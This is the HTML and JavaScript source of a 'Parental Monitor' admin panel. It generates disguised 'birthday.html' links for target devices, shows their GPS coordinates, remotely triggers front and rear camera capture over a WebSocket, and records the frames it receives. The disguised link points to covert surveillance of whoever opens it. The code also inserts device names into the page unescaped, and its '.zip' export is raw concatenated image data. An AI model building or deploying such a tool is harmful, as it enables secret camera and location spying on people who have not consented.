<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial; background: #f5f5f5; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #333; margin-bottom: 30px; }
        .section { background: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        input { padding: 10px; border: 1px solid #ddd; border-radius: 5px; width: 300px; margin-right: 10px; }
        button { padding: 10px 20px; background: #667eea; color: white; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background: #5568d3; }
        .link-box { margin-top: 15px; padding: 15px; background: #f9f9f9; border-radius: 5px; }
        .link-box input { width: 100%; margin: 0; }
        .devices { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
        .device { padding: 15px; border: 2px solid #ddd; border-radius: 8px; cursor: pointer; }
        .device.online { border-color: #4caf50; background: #f1f8f4; }
        .device.offline { border-color: #f44336; background: #fef1f0; }
        .device h3 { margin-bottom: 10px; }
        .status { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 12px; }
        .status.online { background: #4caf50; color: white; }
        .status.offline { background: #f44336; color: white; }
        .monitor { display: none; }
        .monitor.active { display: block; }
        .monitor-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-top: 20px; }
        .monitor-box { padding: 15px; background: #f9f9f9; border-radius: 8px; }
        .monitor-box h4 { margin-bottom: 10px; }
        .monitor-box img { width: 100%; border-radius: 5px; }
        .back-btn { background: #999; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📱 Parental Monitor - Admin Panel</h1>
        
        <div class="section">
            <h2>➕ Generate Device Link</h2>
            <input type="text" id="deviceName" placeholder="Enter device name">
            <button onclick="generateLink()">Generate Link</button>
            <div id="linkBox" class="link-box" style="display:none;">
                <input type="text" id="deviceLink" readonly>
                <button onclick="copyLink()">Copy Link</button>
            </div>
        </div>
        
        <div class="section" id="devicesSection">
            <h2>📱 Connected Devices</h2>
            <div class="devices" id="deviceList"></div>
        </div>
        
        <div class="section monitor" id="monitorSection">
            <button class="back-btn" onclick="showDevices()">← Back to Devices</button>
            <h2 id="monitorTitle">Device Monitor</h2>
            <div class="monitor-grid">
                <div class="monitor-box">
                    <h4>📷 Front Camera</h4>
                    <div id="frontCameraView" style="min-height:300px;background:#eee;display:flex;align-items:center;justify-content:center;margin-bottom:15px;">Waiting...</div>
                    <button onclick="startCamera('front')" style="width:48%;font-size:16px;padding:12px;margin-right:2%;">📷 Start</button>
                    <button id="frontRecBtn" onclick="toggleRecording('front')" style="width:48%;font-size:16px;padding:12px;background:#f44336;">⏺ Record</button>
                </div>
                <div class="monitor-box">
                    <h4>📷 Rear Camera</h4>
                    <div id="rearCameraView" style="min-height:300px;background:#eee;display:flex;align-items:center;justify-content:center;margin-bottom:15px;">Waiting...</div>
                    <button onclick="startCamera('rear')" style="width:48%;font-size:16px;padding:12px;margin-right:2%;">📷 Start</button>
                    <button id="rearRecBtn" onclick="toggleRecording('rear')" style="width:48%;font-size:16px;padding:12px;background:#f44336;">⏺ Record</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        let ws;
        let devices = [];
        let selectedDevice = null;
        let map = null;
        let marker = null;
        let frontRecorder = null;
        let rearRecorder = null;
        let frontChunks = [];
        let rearChunks = [];

        function connect() {
            const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            ws = new WebSocket(`${wsProtocol}//${window.location.host}?type=admin`);
            
            ws.onopen = () => console.log('Connected');
            
            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                
                if (data.type === 'devices') {
                    devices = data.devices;
                    renderDevices();
                } else if (data.type === 'device_update') {
                    const idx = devices.findIndex(d => d.id === data.device.id);
                    if (idx >= 0) devices[idx] = data.device;
                    else devices.push(data.device);
                    renderDevices();
                } else if (data.type === 'camera') {
                    const viewId = data.camera === 'front' ? 'frontCameraView' : 'rearCameraView';
                    const img = document.createElement('img');
                    img.src = data.image;
                    img.style.width = '100%';
                    img.style.height = 'auto';
                    document.getElementById(viewId).innerHTML = '';
                    document.getElementById(viewId).appendChild(img);
                    
                    // Record if active
                    if (data.camera === 'front' && frontRecorder && frontRecorder.state === 'recording') {
                        const canvas = document.createElement('canvas');
                        canvas.width = img.naturalWidth;
                        canvas.height = img.naturalHeight;
                        canvas.getContext('2d').drawImage(img, 0, 0);
                        canvas.toBlob(blob => frontChunks.push(blob), 'image/jpeg', 1.0);
                    }
                    if (data.camera === 'rear' && rearRecorder && rearRecorder.state === 'recording') {
                        const canvas = document.createElement('canvas');
                        canvas.width = img.naturalWidth;
                        canvas.height = img.naturalHeight;
                        canvas.getContext('2d').drawImage(img, 0, 0);
                        canvas.toBlob(blob => rearChunks.push(blob), 'image/jpeg', 1.0);
                    }
                }
            };
            
            ws.onclose = () => setTimeout(connect, 3000);
        }

        function renderDevices() {
            const list = document.getElementById('deviceList');
            list.innerHTML = devices.map(d => `
                <div class="device ${d.status}" onclick="selectDevice('${d.id}')">
                    <h3>${d.name}</h3>
                    <span class="status ${d.status}">${d.status}</span>
                    <p>📍 ${d.lat ? d.lat.toFixed(4) : '0.0000'}, ${d.lng ? d.lng.toFixed(4) : '0.0000'}</p>
                </div>
            `).join('');
        }

        function generateLink() {
            const name = document.getElementById('deviceName').value;
            if (!name) return alert('Enter device name');
            
            const id = Math.random().toString(36).substr(2, 8);
            const protocol = window.location.protocol;
            const host = window.location.host;
            const link = `${protocol}//${host}/birthday.html?id=${id}&name=${encodeURIComponent(name)}`;
            
            fetch('/api/device/register', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id, name })
            });
            
            document.getElementById('deviceLink').value = link;
            document.getElementById('linkBox').style.display = 'block';
        }

        function copyLink() {
            const input = document.getElementById('deviceLink');
            input.select();
            document.execCommand('copy');
            alert('Link copied!');
        }

        function selectDevice(id) {
            selectedDevice = devices.find(d => d.id === id);
            document.getElementById('monitorTitle').textContent = `Monitor: ${selectedDevice.name}`;
            document.getElementById('devicesSection').style.display = 'none';
            document.getElementById('monitorSection').classList.add('active');
            
            // Auto-start both cameras
            setTimeout(() => {
                startCamera('front');
                startCamera('rear');
            }, 500);
        }

        function showDevices() {
            document.getElementById('devicesSection').style.display = 'block';
            document.getElementById('monitorSection').classList.remove('active');
        }

        function startCamera(type) {
            if (selectedDevice) {
                ws.send(JSON.stringify({ type: 'request_camera', deviceId: selectedDevice.id, camera: type }));
            }
        }

        function toggleRecording(camera) {
            const btnId = camera + 'RecBtn';
            const btn = document.getElementById(btnId);
            
            if (camera === 'front') {
                if (!frontRecorder || frontRecorder.state === 'inactive') {
                    frontChunks = [];
                    frontRecorder = { state: 'recording' };
                    btn.textContent = '⏹ Stop';
                    btn.style.background = '#4caf50';
                } else {
                    frontRecorder.state = 'inactive';
                    saveRecording(frontChunks, 'front');
                    btn.textContent = '⏺ Record';
                    btn.style.background = '#f44336';
                }
            } else {
                if (!rearRecorder || rearRecorder.state === 'inactive') {
                    rearChunks = [];
                    rearRecorder = { state: 'recording' };
                    btn.textContent = '⏹ Stop';
                    btn.style.background = '#4caf50';
                } else {
                    rearRecorder.state = 'inactive';
                    saveRecording(rearChunks, 'rear');
                    btn.textContent = '⏺ Record';
                    btn.style.background = '#f44336';
                }
            }
        }

        function saveRecording(chunks, camera) {
            if (chunks.length === 0) return alert('No frames recorded');
            
            const zip = chunks;
            const blob = new Blob(zip, { type: 'application/octet-stream' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `${selectedDevice.name}_${camera}_${Date.now()}.zip`;
            a.click();
            URL.revokeObjectURL(url);
            alert(`Saved ${chunks.length} frames`);
        }

        connect();
    </script>
</body>
</html>
